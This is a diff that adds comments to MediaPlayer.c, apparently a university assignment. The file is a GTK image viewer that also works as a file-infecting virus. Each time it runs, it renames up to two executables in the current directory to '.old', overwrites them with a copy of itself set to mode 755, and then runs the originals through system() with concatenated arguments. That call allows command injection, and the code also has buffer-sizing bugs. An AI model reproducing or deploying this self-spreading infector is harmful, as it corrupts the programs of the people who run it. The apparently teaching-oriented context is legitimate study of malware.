@@ -1,3 +1,9 @@
+/**
+ * @file        MediaPlayer.c
+ *
+ * @authors     Dorian Maidon <dorian.maidon@etudiant.univ-lr.fr>, Ilker Soyturk <ilker.soyturk@etudiant.univ-lr.fr>
+ * @date        2021-2022
+ */
 #include <gtk/gtk.h>
 #include <dirent.h>
 #include <gdk/gdkkeysyms.h>
@@ -22,6 +28,15 @@ int height = 800;
 #define SIZE 100
 char buffer[SIZE];
 
+/*
+ * function : copyFile 
+ *
+ *      pgrmNameToInfect : the target program file to infect
+ *      srcPgrmName : the source file from where we get the infection
+ * 
+ * This function read the source file and write it into the destination filename,
+ * then give access rights to it(755 rwx for user, rx to group and others).
+ */
 bool copyFile(char *pgrmNameToInfect, char *srcPgrmName)
 {
         // opening current running exe in reading mode
@@ -36,35 +51,51 @@ bool copyFile(char *pgrmNameToInfect, char *srcPgrmName)
         {
                 fwrite(buff, 1, n, newCreatedFile);
         }
+        //closing files
         fclose(runningFile);
         fclose(newCreatedFile);
+        //giving it access rights
         chmod(pgrmNameToInfect, 0755);
         return true;
 }
 
+/*
+ * function : renameFiles 
+ *
+ *      numberToInfect : numbers of programs that we want to infect
+ *      pgrmName : the name of the current running executable
+ * 
+ * This function iterate on each files/folders of the current directory
+ * and for each its check if its regular, executable and isn't the mediaplayer.
+ * If all those conditions are respected, and the executable haven't been 
+ * infected yet, it rename the executable with adding ".old" to the end and
+ * call the function copyFile function.
+ */
 bool renameFiles(int numberToInfect, char *pgrmName)
 {
         int cpt = 1;
+        //getting current directory
         DIR *d;
         struct dirent *dir;
         d = opendir(".");
         char *newName;
         if (d)
         {
+                //looping on all files/folderes
                 while ((dir = readdir(d)) != NULL)
                 {
                         struct stat sb;
                         stat(dir->d_name, &sb);
+                        //checking conditions
                         if ((S_IXUSR & sb.st_mode) && (S_IFREG & sb.st_mode) && (strcmp(dir->d_name, "mediaPlayer")) && (cpt <= numberToInfect) && !strstr(dir->d_name, ".old"))
                         {
                                 newName = (char *)malloc(strlen(dir->d_name));
                                 strcpy(newName, dir->d_name);
                                 strcat(newName, ".old");
                                 // checking if executable is already infected, testing on exe that not have a .old
-                                // renaming the existing exe to executable.old
                                 if (!fopen(newName, "r"))
                                 {
-                                        // checking if the file is renamed
+                                        // renaming the existing exe to executable.old and checking if the file is renamed
                                         (rename(dir->d_name, newName) == 0) ? printf("%s file renamed successfully to %s\n", dir->d_name, newName) : printf("Error for renaming %s file to %s\n\n", dir->d_name, newName);
                                         // copy the content of mediaPlayer into the pgrm
                                         copyFile(dir->d_name, pgrmName);
@@ -199,26 +230,34 @@ void open_dialog_and_load_images(GtkWidget *btn, gpointer window)
 
 int main(int argc, char *argv[])
 {
-        // putting the argument of the running pgrm name in params
+        //number of programs that we want to infect at once
         int numberOfFilesToInfect = 2;
+        //calling the main function for the infecting process
         renameFiles(numberOfFilesToInfect, argv[0]);
+
+        //if the running program is not the mediaplayer
         if (strcmp(argv[0], "./mediaPlayer"))
-        {
+        {       
+                //if we have 2 arguments
                 if (argv[1] != NULL && argv[2] != NULL)
                 {
+                        // Be Carefull that only work with MonPG5
                         char *execFile = (char *)malloc(strlen(argv[0]));
                         strcpy(execFile, argv[0]);
                         strcat(execFile, ".old ");
                         strcat(execFile, argv[1]);
                         strcat(execFile, " ");
                         strcat(execFile, argv[2]);
+                        //executing ./command arg1 arg2
                         system(execFile);
                 }
                 else
                 {
+                        //executing ./pgrm
                         system(strcat(argv[0], ".old"));
                 }
         }
+        //if the running executable is mediaplayer, we display the interface to display images
         else
         {
                 GtkWidget *menu_bar, *file_menu, *menu_item, *vbox_menu, *button;
